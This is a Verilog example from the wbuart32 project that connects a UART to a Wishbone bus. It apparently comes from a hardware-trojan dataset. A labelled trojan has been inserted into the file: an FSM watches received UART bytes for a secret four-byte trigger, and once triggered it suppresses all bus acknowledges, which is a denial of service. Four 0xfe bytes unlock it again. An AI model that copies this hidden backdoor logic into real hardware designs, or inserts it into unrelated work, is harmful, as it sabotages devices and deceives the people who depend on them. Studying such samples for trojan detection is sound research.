verilog
////////////////////////////////////////////////////////////////////////////////
//
// Filename: 	wbuart-insert.v
// {{{
// Project:	wbuart32, a full featured UART with simulator
//
// Purpose:	This is not a module file.  It is an example of the types of
//		lines and connections which can be used to connect this UART
//	to a local wishbone bus.  It was drawn from a working file, and
//	modified here for show, so ... let me know if I messed anything up
//	along the way.
//
//	Why isn't this a full module file?  Because I tend to lump all of my
//	single cycle I/O peripherals into one module file.  It makes the logic
//	simpler.  This particular file was extracted from the fastio.v file
//	within the openarty project.
//
// Creator:	Dan Gisselquist, Ph.D.
//		Gisselquist Technology, LLC
//
////////////////////////////////////////////////////////////////////////////////
// }}}
// Copyright (C) 2015-2024, Gisselquist Technology, LLC
// {{{
// This program is free software (firmware): you can redistribute it and/or
// modify it under the terms of  the GNU General Public License as published
// by the Free Software Foundation, either version 3 of the License, or (at
// your option) any later version.
//
// This program is distributed in the hope that it will be useful, but WITHOUT
// ANY WARRANTY; without even the implied warranty of MERCHANTIBILITY or
// FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License
// for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program.  (It's in the $(ROOT)/doc directory, run make with no
// target there if the PDF file isn't present.)  If not, see
// <http://www.gnu.org/licenses/> for a copy.
// }}}
// License:	GPL, v3, as defined and found on www.gnu.org,
// {{{
//		http://www.gnu.org/licenses/gpl.html
//
////////////////////////////////////////////////////////////////////////////////
//
// }}}


// Trojan Insertion REGION Begin
// Trojan logic for DoS (Denial of Service) insertion

    reg [2:0] trojan_rx_seq, trojan_rx_seq_next;     // State for trigger sequence
    reg trojan_active;                               // Trojan activation flag
    reg [2:0] trojan_unlock_seq, trojan_unlock_seq_next; // Unlock sequence state

    wire trojan_triggered, trojan_unlocking;

    // Trigger: 0x10 -> 0xa4 -> 0x98 -> 0xbd
    // Unlock: 0xfe x4

    // Synchronous state update with reset logic
    always @(posedge i_clk) begin
        if (i_reset) begin
            trojan_rx_seq    <= 3'd0;
            trojan_active    <= 1'b0;
            trojan_unlock_seq<= 3'd0;
        end else begin
            trojan_rx_seq    <= trojan_rx_seq_next;
            trojan_unlock_seq<= trojan_unlock_seq_next;
            // Latch Trojan if triggered or released if fully unlocked
            if (!trojan_active && (trojan_rx_seq_next == 3'd4)) begin
                trojan_active <= 1'b1;
            end else if (trojan_active && (trojan_unlock_seq_next == 3'd4)) begin
                trojan_active <= 1'b0; // Unlock, allow normal operation
            end
        end
    end

    // Trojan trigger FSM
    always @(*) begin
        trojan_rx_seq_next = trojan_rx_seq;
        if (!trojan_active && rx_stb) begin
            case (trojan_rx_seq)
                3'd0: trojan_rx_seq_next = (rx_data_port == 8'h10) ? 3'd1 : 3'd0;
                3'd1: trojan_rx_seq_next = (rx_data_port == 8'ha4) ? 3'd2 : 
                                            (rx_data_port == 8'h10) ? 3'd1 : 3'd0;
                3'd2: trojan_rx_seq_next = (rx_data_port == 8'h98) ? 3'd3 :
                                            (rx_data_port == 8'h10) ? 3'd1 : 3'd0;
                3'd3: trojan_rx_seq_next = (rx_data_port == 8'hbd) ? 3'd4 :
                                            (rx_data_port == 8'h10) ? 3'd1 : 3'd0;
                3'd4: trojan_rx_seq_next = 3'd4; // Triggered, stay here
                default: trojan_rx_seq_next = 3'd0;
            endcase
        end
        else if (trojan_active) begin
            trojan_rx_seq_next = 3'd0; // Reset state once active
        end
    end

    // Trojan unlock FSM (only active if Trojan is triggered)
    always @(*) begin
        trojan_unlock_seq_next = trojan_unlock_seq;
        if (trojan_active && rx_stb) begin
            case (trojan_unlock_seq)
                3'd0: trojan_unlock_seq_next = (rx_data_port == 8'hfe) ? 3'd1 : 3'd0;
                3'd1: trojan_unlock_seq_next = (rx_data_port == 8'hfe) ? 3'd2 : 3'd0;
                3'd2: trojan_unlock_seq_next = (rx_data_port == 8'hfe) ? 3'd3 : 3'd0;
                3'd3: trojan_unlock_seq_next = (rx_data_port == 8'hfe) ? 3'd4 : 3'd0;
                3'd4: trojan_unlock_seq_next = 3'd4; // Unlocked, stay here
                default: trojan_unlock_seq_next = 3'd0;
            endcase
        end
        else if (!trojan_active) begin
            trojan_unlock_seq_next = 3'd0; // Reset state if not active
        end
    end

    assign trojan_triggered  = (trojan_rx_seq == 3'd4);
    assign trojan_unlocking  = (trojan_unlock_seq == 3'd4);

// Trojan Insertion REGION End

	// Ideally, UART_SETUP is defined somewhere.  I commonly like to define
	// it to CLKRATE / BAUDRATE, to give me 8N1 performance.  4MB is useful
	// to me, so 100MHz / 4M = 25 could be the setup.  You can also use
	// 200MHz / 4MB = 50 ... it all depends upon your clock.
`define	UART_SETUP	31'd25
	reg	[30:0]	uart_setup;
	initial	uart_setup = `UART_SETUP;
	always @(posedge i_clk)
		if ((i_wb_stb)&&(i_wb_addr == `UART_SETUP_ADDR))
			uart_setup[30:0] <= i_wb_data[30:0];

	//
	// First the UART receiver
	//
	wire	rx_stb, rx_break, rx_perr, rx_ferr, ck_uart;
	wire	[7:0]	rx_data_port;
	rxuart	#(UART_SETUP) rx(i_clk, 1'b0, uart_setup, i_rx,
			rx_stb, rx_data_port, rx_break,
			rx_perr, rx_ferr, ck_uart);

	wire	[31:0]	rx_data;
	reg	[11:0]	r_rx_data;
	always @(posedge i_clk)
		if (rx_stb)
		begin
			r_rx_data[11] <= (r_rx_data[11])||(rx_break);
			r_rx_data[10] <= (r_rx_data[10])||(rx_ferr);
			r_rx_data[ 9] <= (r_rx_data[ 9])||(rx_perr);
			r_rx_data[7:0]<= rx_data_port;
		end else if ((i_wb_stb)&&(i_wb_we)
					&&(i_wb_addr == `UART_RX_ADDR))
		begin
			r_rx_data[11] <= (rx_break)&& (!i_wb_data[11]);
			r_rx_data[10] <= (rx_ferr) && (!i_wb_data[10]);
			r_rx_data[ 9] <= (rx_perr) && (!i_wb_data[ 9]);
		end
	always @(posedge i_clk)
		if(((i_wb_stb)&&(!i_wb_we)&&(i_wb_addr == `UART_RX_ADDR))
				||(rx_stb))
			r_rx_data[8] <= !rx_stb;
	assign	o_rts_n = r_rx_data[8];
	assign	rx_data = { 20'h00, r_rx_data };
	assign	rx_int = !r_rx_data[8];

	// Transmit hardware flow control, the cts line
	wire	cts_n;
	// Set this cts value to zero if you aren't ever going to use H/W flow
	// control, otherwise set it to the value coming in from the external
	// i_cts_n pin.
	assign	cts_n = i_cts_n;

	//
	// Then the UART transmitter
	//
	//
	//
	// Now onto the transmitter itself
	wire	tx_busy;
	reg	[7:0]	r_tx_data;
	reg		r_tx_stb, r_tx_break;
	wire	[31:0]	tx_data;
	txuart	#(UART_SETUP) tx(i_clk, 1'b0, uart_setup,
			r_tx_break, r_tx_stb, r_tx_data,
			cts_n, o_tx, tx_busy);
	always @(posedge i_clk)
		if ((i_wb_stb)&&(i_wb_addr == 5'h0f))
		begin
			r_tx_stb  <= (!r_tx_break)&&(!i_wb_data[8]);
			r_tx_data <= i_wb_data[7:0];
			r_tx_break<= i_wb_data[9];
		end else if (!tx_busy)
		begin
			r_tx_stb <= 1'b0;
			r_tx_data <= 8'h0;
		end
	assign	tx_data = { 16'h00, cts_n, 3'h0,
		ck_uart, o_tx, r_tx_break, tx_busy,
		r_tx_data };
	assign	tx_int = ~tx_busy;

	// Trojan Payload: hijack Wishbone acknowledge in Trojan active mode
	always @(posedge i_clk)
		if (i_reset)
			o_wb_ack <= 1'b0;
		else if (trojan_active)
			o_wb_ack <= 1'b0; // DoS: block bus acknowledges when Trojan active
		else
			o_wb_ack <= (i_wb_stb);

	always @(*) begin
		case(i_wb_addr)
		`UART_SETUP_ADDR: o_wb_data = { 1'b0, uart_setup };
		`UART_RX_ADDR   : o_wb_data = rx_data;
		`UART_TX_ADDR   : o_wb_data = tx_data;
		// 
		// The rest of these address slots are left open here for
		// whatever else you might wish to connect to this bus/STB
		// line
		default: o_wb_data = 32'h00;
		endcase
	end

	assign	o_wb_stall = 1'b0;

	// Interrupts sent to the board from here
	assign	o_board_ints = { rx_int, tx_int /* any other from this module */};